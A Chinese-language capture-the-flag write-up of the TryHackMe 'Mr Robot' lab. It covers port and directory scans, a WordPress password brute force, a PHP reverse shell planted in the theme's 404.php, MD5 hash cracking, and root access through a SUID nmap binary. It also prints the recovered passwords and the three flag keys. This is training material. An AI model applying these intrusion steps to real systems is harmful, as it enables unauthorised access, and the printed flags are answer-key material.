#服务发现
```
┌──(root💀kali)-[~/tryhackme/mrrobot]
└─# nmap -sV -Pn 10.10.180.172 -p-  
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 02:33 EDT
Nmap scan report for 10.10.180.172
Host is up (0.31s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 398.37 seconds
```

#检查http://10.10.180.172/robots.txt，显示两个文件
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

#打开http://10.10.180.172/key-1-of-3.txt，找到key 1
```
073403c8a58a1f80d943455fb30724b9
```

#fsocity.dic下载下来，像是一个字典文件,可能是登陆密码字典，那么现在需要的是一个可登陆的用户名？



#目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -u "http://10.10.180.172"  -e* -t 100  

 _|. _ _  _  _  _ _|_    v0.3.8                                                                                                                                                                                                             
(_||| _) (/_(_|| (_| )                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 6100

Error Log: /root/dirsearch/logs/errors-21-09-15_03-27-35.log

Target: http://10.10.180.172                                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
[03:27:36] Starting: 
[03:29:13] 403 -  218B  - /.user.ini                           
[03:29:46] 301 -    0B  - /0  ->  http://10.10.180.172/0/                          
[03:31:19] 301 -  233B  - /admin  ->  http://10.10.180.172/admin/        
[03:31:39] 200 -    1KB - /admin/                                    
[03:31:39] 403 -  224B  - /admin/.htaccess
[03:31:39] 200 -    1KB - /admin/?/login
[03:31:43] 301 -    0B  - /adm/index.php  ->  http://10.10.180.172/adm/
[03:32:00] 200 -    1KB - /admin/index            
[03:32:00] 200 -    1KB - /admin/index.html
[03:32:26] 301 -    0B  - /admin/index.php  ->  http://10.10.180.172/admin/                                   
[03:32:45] 301 -    0B  - /admin2/index.php  ->  http://10.10.180.172/admin2/
[03:33:01] 301 -    0B  - /admin_area/index.php  ->  http://10.10.180.172/admin_area/
[03:33:50] 301 -    0B  - /adminarea/index.php  ->  http://10.10.180.172/adminarea/
[03:34:37] 301 -    0B  - /administrator/index.php  ->  http://10.10.180.172/administrator/
[03:35:33] 301 -    0B  - /apc/index.php  ->  http://10.10.180.172/apc/                                             
[03:35:40] 301 -  233B  - /audio  ->  http://10.10.180.172/audio/
[03:36:05] 301 -    0B  - /atom  ->  http://10.10.180.172/feed/atom/    
[03:36:35] 301 -  232B  - /blog  ->  http://10.10.180.172/blog/
[03:36:38] 301 -    0B  - /bb-admin/index.php  ->  http://10.10.180.172/bb-admin/
[03:36:52] 301 -    0B  - /bitrix/admin/index.php  ->  http://10.10.180.172/bitrix/admin/
[03:37:46] 301 -    0B  - /Citrix/AccessPlatform/auth/clientscripts/cookies.js  ->  http://10.10.180.172/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[03:38:36] 301 -  231B  - /css  ->  http://10.10.180.172/css/                    
[03:40:26] 301 -    0B  - /engine/classes/swfupload/swfupload.swf  ->  http://10.10.180.172/engine/classes/swfupload/swfupload.swf
[03:40:27] 301 -    0B  - /engine/classes/swfupload/swfupload_f9.swf  ->  http://10.10.180.172/engine/classes/swfupload/swfupload_f9.swf
[03:40:42] 301 -    0B  - /etc/lib/pChart2/examples/imageMap/index.php  ->  http://10.10.180.172/etc/lib/pChart2/examples/imageMap/
[03:40:52] 301 -    0B  - /extjs/resources/charts.swf  ->  http://10.10.180.172/extjs/resources/charts.swf
[03:40:55] 200 -    0B  - /favicon.ico             
[03:41:04] 301 -    0B  - /feed  ->  http://10.10.180.172/feed/                                         
[03:42:04] 301 -  234B  - /images  ->  http://10.10.180.172/images/      
[03:42:10] 301 -    0B  - /html/js/misc/swfupload/swfupload.swf  ->  http://10.10.180.172/html/js/misc/swfupload/swfupload.swf
[03:42:25] 200 -    1KB - /index.html                             
[03:42:29] 301 -    0B  - /image  ->  http://10.10.180.172/image/    
[03:42:51] 301 -    0B  - /index.php  ->  http://10.10.180.172/                                                  
[03:42:51] 200 -  504KB - /intro
[03:42:52] 301 -    0B  - /index.php/login/  ->  http://10.10.180.172/login/
[03:43:05] 301 -  230B  - /js  ->  http://10.10.180.172/js/
[03:43:31] 200 -  309B  - /license.txt                                                                  
[03:44:22] 302 -    0B  - /login  ->  http://10.10.180.172/wp-login.php                   
[03:44:30] 302 -    0B  - /login/  ->  http://10.10.180.172/wp-login.php
[03:45:10] 301 -    0B  - /modelsearch/index.php  ->  http://10.10.180.172/modelsearch/
[03:45:11] 301 -    0B  - /myadmin/index.php  ->  http://10.10.180.172/myadmin/
[03:45:19] 301 -    0B  - /panel-administracion/index.php  ->  http://10.10.180.172/panel-administracion/
[03:45:23] 403 -   94B  - /phpmyadmin                                                   
[03:45:53] 403 -   94B  - /phpmyadmin/           
[03:45:54] 403 -   94B  - /phpmyadmin/scripts/setup.php      
[03:46:40] 301 -    0B  - /pma/index.php  ->  http://10.10.180.172/pma/                          
[03:46:53] 200 -   64B  - /readme                  
[03:46:53] 200 -   64B  - /readme.html
[03:47:13] 200 -   41B  - /robots.txt                     
[03:47:42] 301 -    0B  - /rss  ->  http://10.10.180.172/feed/
[03:48:29] 200 -    0B  - /sitemap                                                                                
[03:48:29] 200 -    0B  - /sitemap.xml
[03:48:30] 200 -    0B  - /sitemap.xml.gz
[03:48:53] 301 -    0B  - /siteadmin/index.php  ->  http://10.10.180.172/siteadmin/
[03:49:16] 301 -    0B  - /sql/index.php  ->  http://10.10.180.172/sql/                      
[03:50:32] 301 -    0B  - /templates/ja-helio-farsi/index.php  ->  http://10.10.180.172/templates/ja-helio-farsi/
[03:50:33] 301 -    0B  - /templates/rhuk_milkyway/index.php  ->  http://10.10.180.172/templates/rhuk_milkyway/
[03:50:33] 301 -    0B  - /templates/beez/index.php  ->  http://10.10.180.172/templates/beez/
[03:50:59] 301 -    0B  - /tmp/index.php  ->  http://10.10.180.172/tmp/       
[03:52:05] 301 -  236B  - /wp-admin  ->  http://10.10.180.172/wp-admin/
[03:52:09] 301 -  238B  - /wp-content  ->  http://10.10.180.172/wp-content/
[03:52:10] 403 -  245B  - /wp-content/plugins/akismet/admin.php
[03:52:10] 403 -  247B  - /wp-content/plugins/akismet/akismet.php
[03:52:11] 403 -  228B  - /wp-content/uploads/
[03:52:11] 301 -  239B  - /wp-includes  ->  http://10.10.180.172/wp-includes/
[03:52:11] 403 -  221B  - /wp-includes/
[03:52:16] 301 -    0B  - /webadmin/index.php  ->  http://10.10.180.172/webadmin/
[03:52:30] 302 -    0B  - /wp-admin/  ->  http://10.10.180.172/wp-login.php?redirect_to=http%3A%2F%2F10.10.180.172%2Fwp-admin%2F&reauth=1
[03:52:31] 500 -    3KB - /wp-admin/setup-config.php
[03:52:35] 200 -    0B  - /wp-content/         
[03:52:37] 200 -    0B  - /wp-content/plugins/google-sitemap-generator/sitemap-core.php
[03:52:37] 500 -    0B  - /wp-includes/rss-functions.php
[03:52:37] 200 -    3KB - /wp-login                                      
[03:52:38] 200 -    3KB - /wp-login.php                                       
[03:52:38] 200 -    3KB - /wp-login/
[03:52:38] 301 -    0B  - /wp-register.php  ->  http://10.10.180.172/wp-login.php?action=register
[03:52:51] 405 -   42B  - /xmlrpc.php  
```
#wpscan挖掘wordpress信息，没什么有用的信息，枚举authid也无法爆破wordpress用户名
```
┌──(root💀kali)-[~/tryhackme/mrrobot]
└─# wpscan --url http://10.10.180.172        
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.180.172/ [10.10.180.172]
[+] Started: Wed Sep 15 02:55:03 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.180.172/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.180.172/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] The external WP-Cron seems to be enabled: http://10.10.180.172/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.180.172/d6f242c.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.180.172/d6f242c.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.180.172/wp-content/themes/twentyfifteen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.180.172/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://10.10.180.172/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.180.172/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:12:45 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:12:45

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Sep 15 03:17:20 2021
[+] Requests Done: 173
[+] Cached Requests: 6
[+] Data Sent: 42.372 KB
[+] Data Received: 267.073 KB
[+] Memory used: 209.672 MB
[+] Elapsed time: 00:22:17
```

#首页命令行支持6个命令，研究了半天，没看到有什么有用的信息
```
prepare    --->显示动画：whoismyrobot.com
fsociety   --->显示动画：are you ready to join fsociety
inform     --->显示四张图片，表达了一些观点，没看出来有什么线索
question   --->显示四张图片，分别批判了patriot，executive，capitalist，businessman
wakeup	   --->显示一个动画，没有文字
join	   --->留下一个邮箱
```


#在http://10.10.180.172/license.txt，打开f12，找到base64加密过的隐藏线索
```
what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
do you want a password or something?
ZWxsaW90OkVSMjgtMDY1Mgo=
```

#解密后：
```
elliot:ER28-0652
```

#登陆进去以后，在users里收集到两个用户名和邮箱
```
elliot     Elliot Alderson	  elliot@mrrobot.com
mich05654  krista Gordon	  kgordon@therapist.com
```

#用下载的字典爆破mich05654账号
```
wpscan --url http://10.10.180.172/ --usernames mich05654 --passwords /root/tryhackme/mrrobot/fsocity.dic

[!] Valid Combinations Found:
 | Username: mich05654, Password: Dylan_2791
```

#然而登陆进去好像没什么有用的信息？

#回到elliot登录界面
在后台页面 Appearace->Theme Editer可以编辑在使用皮肤里面的php代码，我们选择404.php这个文件，上传一个反弹shell
使用这个payload ：
```https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php```
把代码复制到404.php,修改反弹主机信息
开启监听
在前台页面随便输入一个不存在的页面，触发反弹shell    -->http://10.10.180.172/asdasddasdas


#在/home/robot目录找到key-2-of-3.txt文件，但是webshell没有读权限
在同目录找到一个哈希文件
```
$ ls -alh
ls -alh
total 16K
drwxr-xr-x 2 root  root  4.0K Nov 13  2015 .
drwxr-xr-x 3 root  root  4.0K Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

```

#把哈希文件保存到靶机的hash.txt，用jonn爆破
```
┌──(root💀kali)-[~/tryhackme/mrrobot]
└─# john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (robot)
1g 0:00:00:00 DONE (2021-09-15 22:49) 50.00g/s 2025Kp/s 2025Kc/s 2025KC/s bonjour1..123092
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

#密码：abcdefghijklmnopqrstuvwxyz，切换到tty以后su robot，查看key-2-of-3.txt
```
$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
robot@linux:~$ 

```

#根据提示，查看nmap权限，发现是一个suid
```
robot@linux:~$ whereis nmap
whereis nmap
nmap: /usr/local/bin/nmap
robot@linux:~$ ls -al /usr/local/bin/nmap
ls -al /usr/local/bin/nmap
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap

```

#根据GTFPbins里nmap的提权方法，这里采用shell-b方法提升到root权限，拿到key-3-of-3.txt
```
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# ls -alh /root 
ls -alh /root
total 32K
drwx------  3 root root 4.0K Nov 13  2015 .
drwxr-xr-x 22 root root 4.0K Sep 16  2015 ..
-rw-------  1 root root 4.0K Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3.2K Sep 16  2015 .bashrc
drwx------  2 root root 4.0K Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1.0K Sep 16  2015 .rnd
# cat /root/key-3-of-3.txt
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
# 
```

